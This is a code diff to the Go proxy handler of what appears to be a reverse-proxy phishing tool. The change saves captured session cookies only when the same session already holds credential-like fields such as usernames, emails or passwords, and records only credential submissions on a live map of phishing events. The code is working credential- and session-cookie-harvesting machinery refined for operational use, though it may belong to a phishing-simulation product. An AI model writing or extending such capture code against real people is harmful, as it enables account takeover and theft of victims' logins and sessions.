@@ -5727,6 +5727,31 @@ func (m *ProxyHandler) saveDirectProxyCapture(
 	cookiesJSON := ""
 
 	if isCookieCapture {
+		// For cookie captures, only save if the session already has credential data
+		// or if the session is complete. This prevents noisy cookie-only entries
+		// from subdomain requests polluting the captures table.
+		hasCredentials := false
+		session.CapturedData.Range(func(key, value interface{}) bool {
+			if dataMap, ok := value.(map[string]string); ok {
+				for field := range dataMap {
+					lf := strings.ToLower(field)
+					if strings.Contains(lf, "user") || strings.Contains(lf, "email") ||
+						strings.Contains(lf, "login") || strings.Contains(lf, "pass") ||
+						strings.Contains(lf, "pwd") {
+						hasCredentials = true
+						return false
+					}
+				}
+			}
+			return true
+		})
+		if !hasCredentials && !session.IsComplete.Load() {
+			m.logger.Debugw("skipping cookie-only capture save (no credentials yet)",
+				"captureName", captureName,
+				"sessionID", session.ID,
+			)
+			return
+		}
 		// For cookie captures, store as JSON in the Cookies field
 		if jsonBytes, err := json.Marshal(capturedData); err == nil {
 			cookiesJSON = string(jsonBytes)
@@ -5804,16 +5829,12 @@ func (m *ProxyHandler) saveDirectProxyCapture(
 		"password", password != "",
 	)
 
-	// Record event on live map
-	if m.LiveMapService != nil {
-		eventType := "proxy_submit"
-		if isCookieCapture {
-			eventType = "proxy_cookie"
-		}
+	// Record event on live map (only for credential captures, not cookie-only captures)
+	if m.LiveMapService != nil && !isCookieCapture {
 		go m.LiveMapService.RecordEvent(
 			clientIP,
 			session.UserAgent,
-			eventType,
+			"proxy_submit",
 			phishDomain,
 		)
 	}
